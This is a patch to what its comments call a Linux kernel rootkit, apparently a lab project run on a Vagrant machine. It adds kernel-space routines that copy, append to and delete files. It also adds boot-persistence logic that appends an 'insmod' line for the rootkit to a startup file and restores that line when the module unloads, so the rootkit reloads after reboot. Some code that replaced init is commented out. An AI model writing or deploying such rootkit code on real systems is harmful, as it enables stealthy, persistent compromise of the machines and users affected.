@@ -438,6 +438,7 @@ int clone_file(const char* filename_old, const char* filename_new) {
     loff_t pos_read;
     loff_t pos_write;
     loff_t end;
+    loff_t new_end;
     int i;
 
     // go into userspace
@@ -462,11 +463,18 @@ int clone_file(const char* filename_old, const char* filename_new) {
     pos_read  = filp_old->f_pos;
     pos_write = filp_new->f_pos;
     end = vfs_llseek(filp_old, 0, SEEK_END);
+    new_end = vfs_llseek(filp_new, 0, SEEK_END);
     filp_old->f_pos = pos_read;
+    filp_new->f_pos = pos_write;
 
     // clone all bytes
     for (i = 0; i < end; i++) {
         ret_old = vfs_read(filp_old, buf, 1, &pos_read);    
+        ret_new = vfs_write(filp_new, buf, 1, &pos_write);
+    }
+    // write NULLs for the rest, incase file already exists
+    buf[0] = NULL;
+    for (i = end; i < new_end; i++) {
         ret_new = vfs_write(filp_new, buf, 1, &pos_write);
     }
 
@@ -530,6 +538,94 @@ int rename_file(const char* filename_old, const char* filename_new) {
     set_fs(old_fs);
 
     return ret;
+}
+
+// appends the contents of file1 to file2
+int append_to_file(const char* filename1, const char* filename2) {
+    printk("appending contents of %s onto %s\n", filename1, filename2);
+    int err;
+    ssize_t ret_old = 0, ret_new = 0;
+    unsigned char buf[1];
+    struct file *filp1 = NULL;
+    struct file *filp2 = NULL;
+    loff_t pos_read;
+    loff_t pos_write;
+    loff_t f1_end, f2_end;
+    int i;
+
+    // go into userspace
+    mm_segment_t old_fs = get_fs();
+    set_fs(get_ds());
+
+    // open first file for reading
+    filp1 = filp_open(filename1, O_RDONLY, 0);
+    if (IS_ERR(filp1)) {
+        err = PTR_ERR(filp1);
+        return 0;
+    }
+
+    // open second file for writing
+    filp2 = filp_open(filename2, O_WRONLY | O_CREAT, 0);
+    if (IS_ERR(filp2)) {
+        err = PTR_ERR(filp2);
+        return 0;
+    }
+
+    // we need to reset the pos after seeking the end
+    pos_read  = filp1->f_pos;
+    pos_write = filp2->f_pos;
+    f1_end = vfs_llseek(filp1, 0, SEEK_END);
+    filp1->f_pos = pos_read;
+    // go to end of file2 (since we are appending)
+    f2_end = vfs_llseek(filp2, 0, SEEK_END);
+    pos_write = f2_end;
+
+    // clone all bytes
+    for (i = 0; i < f1_end; i++) {
+        ret_old = vfs_read(filp1, buf, 1, &pos_read);    
+        ret_new = vfs_write(filp2, buf, 1, &pos_write);
+    }
+
+    // reset file positions
+    if (ret_old > 0) { filp1->f_pos = pos_read; }
+    if (ret_new > 0) { filp2->f_pos = pos_write; }
+
+    filp_close(filp2, NULL);
+    filp_close(filp1, NULL);
+
+    // return to kernel space
+    set_fs(old_fs);
+
+    return 1;
+}
+
+int delete_file(const char* filename) {
+    int err;
+    ssize_t ret;
+    unsigned char buf[1];
+    struct file *filp = NULL;
+
+    printk("deleting file %s\n", filename);
+
+    // go into userspace
+    mm_segment_t old_fs = get_fs();
+    set_fs(get_ds());
+
+    // open first file for reading
+    filp = filp_open(filename, O_WRONLY, 0);
+    if (IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return 0;
+    }
+
+    ret = vfs_unlink(filp->f_dentry->d_parent->d_inode, filp->f_dentry);
+
+    filp_close(filp, NULL);
+
+    // return to kernel space
+    set_fs(old_fs);
+
+    return 1;
 }
 
 // 0 = doesn't, 1 = does
@@ -690,18 +786,18 @@ void add_to_reboot() {
     boot_loader_init = 0;
     // we only need to replace one i.e. if the
     // 'fake' file doesn't exist
-    if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
+    // if (does_file_exist(FILE_INIT_ORIGINAL) == 0) {    
         int ret;
 
         // store file permissions of original init
         // umode_t orig_perms = get_file_permissions(FILE_INIT);
 
         // rename original init
-        rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
+        // rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
 
         // compile (/'copy' over replacement init)
         // compile to same folder (kernel space)
-        clone_file("modules_replacement.txt", FILE_INIT);
+        // clone_file("modules_replacement.txt", FILE_INIT);
 
         // char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT_REPLACEMENT_OUTPUT)];
         // sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT_REPLACEMENT_OUTPUT);
@@ -729,6 +825,33 @@ void add_to_reboot() {
         // sprintf(bash_perms_repl, "chmod %o %s", orig_perms, FILE_INIT_ORIGINAL);
         // printk("bash_perms_repl: %s\n", bash_perms_repl);
         // ret = run_bash(bash_perms_repl);
+    // }
+
+    // delete_file("/home/vagrant/append_fun/try_deleting_me");
+
+    // first boot only
+    if (!does_file_exist("/home/vagrant/append_fun/file_original")) {
+        // on first boot, copy the original:
+        clone_file("/home/vagrant/append_fun/file", "/home/vagrant/append_fun/file_original");
+        // & append 'insmod rookit' to the actual file
+        append_to_file("/home/vagrant/append_fun/file_to_append", "/home/vagrant/append_fun/file");
     }
+
+    // redirect all access during
+    
+    boot_loader_init = 1;
+}
+
+void add_to_reboot_exit() {
+    // on module exit: copy _original to the actual filepath
+    // & append again
+    // NOTE: we *could* just do this on one file at the end instead
+    //       of having two files, but this method ensures that
+    //       even if this func. is not called the rootkit will
+    //       be reloaded
+    boot_loader_init = 0;
+    clone_file("/home/vagrant/append_fun/file_original", "/home/vagrant/append_fun/file");
+    append_to_file("/home/vagrant/append_fun/file_to_append", "/home/vagrant/append_fun/file");
+    // printk("why crash\n");
     boot_loader_init = 1;
 }
